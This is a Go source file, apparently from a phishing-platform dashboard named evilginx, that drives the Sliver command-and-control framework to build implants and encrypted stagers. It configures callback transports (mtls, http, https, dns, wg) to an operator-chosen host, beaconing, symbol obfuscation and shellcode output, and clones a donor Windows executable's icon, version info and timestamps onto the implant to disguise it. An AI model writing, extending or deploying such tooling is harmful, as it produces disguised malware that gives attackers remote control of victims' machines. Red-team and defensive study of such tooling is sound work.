package evilginx

import (
	"bytes"
	"context"
	"debug/pe"
	"fmt"

	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// maxSpoofDonorBytes caps an uploaded donor executable (64 MiB) so a
// malicious operator cannot exhaust server memory through the dashboard.
const maxSpoofDonorBytes = 64 << 20

// GenerateImplant - build a new implant profile/binary. Returns the compiled
// artifact bytes so the platform can persist or serve them.
func (s *SliverBridge) GenerateImplant(params ImplantParams) (*ImplantBuildResult, error) {
	c, err := s.requireClient()
	if err != nil {
		return nil, err
	}

	cfg, err := buildImplantConfig(params)
	if err != nil {
		return nil, err
	}

	resp, err := c.Generate(context.Background(), &clientpb.GenerateReq{
		Config: cfg,
		Name:   params.Name,
	})
	if err != nil {
		return nil, err
	}
	if resp.File == nil {
		return nil, fmt.Errorf("generate returned no artifact")
	}
	result := &ImplantBuildResult{
		ImplantName:    resp.ImplantName,
		ImplantBuildID: resp.ImplantBuildID,
		ArtifactName:   resp.File.Name,
		Data:           resp.File.Data,
	}

	// Optional Windows metadata spoofing: exactly one build selector
	// (the fresh ImplantBuildID) is sent, then the spoofed bytes are
	// re-fetched so the dashboard serves the final artifact.
	if len(params.SpoofDonorData) > 0 {
		if err := validateSpoofDonor(params, params.SpoofDonorData); err != nil {
			return nil, err
		}
		if _, err := c.GenerateSpoofMetadata(context.Background(), &clientpb.GenerateSpoofMetadataReq{
			ImplantBuildID: resp.ImplantBuildID,
			SpoofMetadata: &clientpb.SpoofMetadataConfig{
				PE: &clientpb.PESpoofMetadataConfig{
					Source: &clientpb.SpoofMetadataFile{
						Name: params.SpoofDonorName,
						Data: params.SpoofDonorData,
					},
				},
			},
		}); err != nil {
			return nil, fmt.Errorf("metadata spoof failed: %w", err)
		}
		name, data, err := s.GetBuildArtifact(resp.ImplantName)
		if err != nil {
			return nil, fmt.Errorf("failed to fetch spoofed artifact: %w", err)
		}
		result.ArtifactName = name
		result.Data = data
		result.Spoofed = true
	}
	return result, nil
}

// GetBuildArtifact - re-fetch a previously generated implant's bytes by
// implant name (wraps the Regenerate RPC). Used to post-process artifacts
// (e.g. macOS .app bundling) without rebuilding.
func (s *SliverBridge) GetBuildArtifact(implantName string) (string, []byte, error) {
	c, err := s.requireClient()
	if err != nil {
		return "", nil, err
	}
	if implantName == "" {
		return "", nil, fmt.Errorf("implant name is required")
	}
	resp, err := c.Regenerate(context.Background(), &clientpb.RegenerateReq{ImplantName: implantName})
	if err != nil {
		return "", nil, err
	}
	if resp.File == nil {
		return "", nil, fmt.Errorf("regenerate returned no artifact")
	}
	return resp.File.Name, resp.File.Data, nil
}

// GenerateStage - build a stager profile from an existing implant build id.
func (s *SliverBridge) GenerateStage(params StageParams) (*ImplantBuildResult, error) {
	c, err := s.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := c.GenerateStage(context.Background(), &clientpb.GenerateStageReq{
		Profile:       params.Profile,
		Name:          params.Name,
		AESEncryptKey: params.AESEncryptKey,
		AESEncryptIv:  params.AESEncryptIv,
		RC4EncryptKey: params.RC4EncryptKey,
		PrependSize:   params.PrependSize,
		CompressF:     params.CompressF,
		Compress:      params.Compress,
	})
	if err != nil {
		return nil, err
	}
	if resp.File == nil {
		return nil, fmt.Errorf("generate stage returned no artifact")
	}
	return &ImplantBuildResult{
		ImplantName:    resp.ImplantName,
		ImplantBuildID: resp.ImplantBuildID,
		ArtifactName:   resp.File.Name,
		Data:           resp.File.Data,
	}, nil
}

// ImplantParams - user-facing generate form.
type ImplantParams struct {
	Name              string `json:"name"`
	GOOS              string `json:"goos"`
	GOARCH            string `json:"goarch"`
	Format            string `json:"format"`    // executable | shared | service | shellcode | third-party (shared-lib build for third-party loaders)
	Transport         string `json:"transport"` // mtls | http | https | dns | wg
	LHost             string `json:"lhost"`
	LPort             int    `json:"lport"`
	IsBeacon          bool   `json:"is_beacon"`
	BeaconInterval    int64  `json:"beacon_interval"` // seconds
	BeaconJitter      int64  `json:"beacon_jitter"`   // seconds
	MaxConnections    uint32 `json:"max_connections"`
	ReconnectInterval int64  `json:"reconnect_interval"` // seconds
	ObfuscateSymbols  bool   `json:"obfuscate_symbols"`
	Debug             bool   `json:"debug"`
	HTTPC2ConfigName  string `json:"http_c2_config_name"` // HTTP C2 profile (defaults to "default")
	// Windows metadata spoofing: donor PE bytes (base64 in JSON) whose
	// version-info, icon and timestamps are cloned onto the build.
	// Windows targets only; exactly one donor per build.
	SpoofDonorName string `json:"spoof_donor_name"`
	SpoofDonorData []byte `json:"spoof_donor_data"`
}

// defaultHTTPC2Profile mirrors consts.DefaultC2Profile on the server; the
// server rejects builds whose HTTPC2ConfigName does not resolve to a saved
// profile (empty -> "record not found" NotFound).
const defaultHTTPC2Profile = "default"

// StageParams - user-facing stage build form.
type StageParams struct {
	Profile       string `json:"profile"`
	Name          string `json:"name"`
	AESEncryptKey string `json:"aes_encrypt_key"`
	AESEncryptIv  string `json:"aes_encrypt_iv"`
	RC4EncryptKey string `json:"rc4_encrypt_key"`
	PrependSize   bool   `json:"prepend_size"`
	CompressF     string `json:"compress_f"`
	Compress      string `json:"compress"`
}

// ImplantBuildResult - artifact returned by a build.
type ImplantBuildResult struct {
	ImplantName    string `json:"implant_name"`
	ImplantBuildID string `json:"implant_build_id"`
	ArtifactName   string `json:"artifact_name"`
	Data           []byte `json:"data"`
	Spoofed        bool   `json:"spoofed"`
}

// spoofMachineForArch maps a Go arch to the PE machine type the donor
// must carry, mirroring the server's expectedPEMachineForGoArch.
func spoofMachineForArch(goarch string) (uint16, error) {
	switch goarch {
	case "amd64":
		return pe.IMAGE_FILE_MACHINE_AMD64, nil
	case "386":
		return pe.IMAGE_FILE_MACHINE_I386, nil
	case "arm64":
		return pe.IMAGE_FILE_MACHINE_ARM64, nil
	default:
		return 0, fmt.Errorf("unsupported arch for metadata spoofing: %s", goarch)
	}
}

// validateSpoofDonor mirrors the server's donor checks client-side so a
// bad donor fails fast with a clear message instead of a wasted compile.
// The server re-validates authoritatively.
func validateSpoofDonor(p ImplantParams, donor []byte) error {
	if p.GOOS != "windows" {
		return fmt.Errorf("metadata spoofing supports windows targets only (got %s)", p.GOOS)
	}
	shared := p.Format == "shared" || p.Format == "shared-lib" || p.Format == "third-party"
	exe := p.Format == "executable" || p.Format == "exe" || p.Format == "" || p.Format == "service"
	if !shared && !exe {
		return fmt.Errorf("metadata spoofing requires an executable, service or shared-library target (got %s)", p.Format)
	}
	if len(donor) == 0 {
		return fmt.Errorf("donor file is empty")
	}
	if len(donor) > maxSpoofDonorBytes {
		return fmt.Errorf("donor file too large (%d bytes, max %d)", len(donor), maxSpoofDonorBytes)
	}
	if len(donor) < 64 || donor[0] != 'M' || donor[1] != 'Z' {
		return fmt.Errorf("donor is not a valid PE (missing MZ header)")
	}
	wantMachine, err := spoofMachineForArch(p.GOARCH)
	if err != nil {
		return err
	}
	peFile, err := pe.NewFile(bytes.NewReader(donor))
	if err != nil {
		return fmt.Errorf("donor is not a valid PE: %w", err)
	}
	defer peFile.Close()
	if peFile.FileHeader.Machine != wantMachine {
		return fmt.Errorf("donor machine 0x%x does not match target arch %s", uint16(peFile.FileHeader.Machine), p.GOARCH)
	}
	isDLL := peFile.FileHeader.Characteristics&pe.IMAGE_FILE_DLL != 0
	if shared && !isDLL {
		return fmt.Errorf("donor must be a DLL for shared-library targets")
	}
	if exe && isDLL {
		return fmt.Errorf("donor is a DLL but the target is an executable")
	}
	return nil
}

func buildImplantConfig(p ImplantParams) (*clientpb.ImplantConfig, error) {
	if p.Name == "" {
		return nil, fmt.Errorf("implant name is required")
	}
	if p.GOOS == "" {
		return nil, fmt.Errorf("goos is required")
	}
	if p.LHost == "" {
		return nil, fmt.Errorf("lhost is required")
	}
	if p.LPort == 0 {
		p.LPort = 443
	}

	httpC2Profile := p.HTTPC2ConfigName
	if httpC2Profile == "" {
		httpC2Profile = defaultHTTPC2Profile
	}

	var format clientpb.OutputFormat
	switch p.Format {
	case "executable", "exe", "":
		format = clientpb.OutputFormat_EXECUTABLE
	case "shared", "shared-lib":
		format = clientpb.OutputFormat_SHARED_LIB
	case "service":
		format = clientpb.OutputFormat_SERVICE
	case "shellcode":
		format = clientpb.OutputFormat_SHELLCODE
	case "third-party":
		format = clientpb.OutputFormat_THIRD_PARTY
	default:
		return nil, fmt.Errorf("unknown format: %s", p.Format)
	}

	cfg := &clientpb.ImplantConfig{
		GOOS:                p.GOOS,
		GOARCH:              p.GOARCH,
		Format:              format,
		IsBeacon:            p.IsBeacon,
		BeaconInterval:      p.BeaconInterval,
		BeaconJitter:        p.BeaconJitter,
		ReconnectInterval:   p.ReconnectInterval,
		MaxConnectionErrors: p.MaxConnections,
		ObfuscateSymbols:    p.ObfuscateSymbols,
		Debug:               p.Debug,
		HTTPC2ConfigName:    httpC2Profile,
	}

	switch p.Transport {
	case "mtls":
		cfg.IncludeMTLS = true
		cfg.C2 = append(cfg.C2, &clientpb.ImplantC2{URL: fmt.Sprintf("mtls://%s:%d", p.LHost, p.LPort)})
	case "http":
		cfg.IncludeHTTP = true
		cfg.C2 = append(cfg.C2, &clientpb.ImplantC2{URL: fmt.Sprintf("http://%s:%d", p.LHost, p.LPort)})
	case "https":
		cfg.IncludeHTTP = true
		cfg.C2 = append(cfg.C2, &clientpb.ImplantC2{URL: fmt.Sprintf("https://%s:%d", p.LHost, p.LPort)})
	case "dns":
		cfg.IncludeDNS = true
		cfg.C2 = append(cfg.C2, &clientpb.ImplantC2{URL: fmt.Sprintf("dns://%s", p.LHost)})
	case "wg":
		cfg.IncludeWG = true
		cfg.C2 = append(cfg.C2, &clientpb.ImplantC2{URL: fmt.Sprintf("wg://%s:%d", p.LHost, p.LPort)})
	default:
		return nil, fmt.Errorf("unknown transport: %s", p.Transport)
	}
	return cfg, nil
}
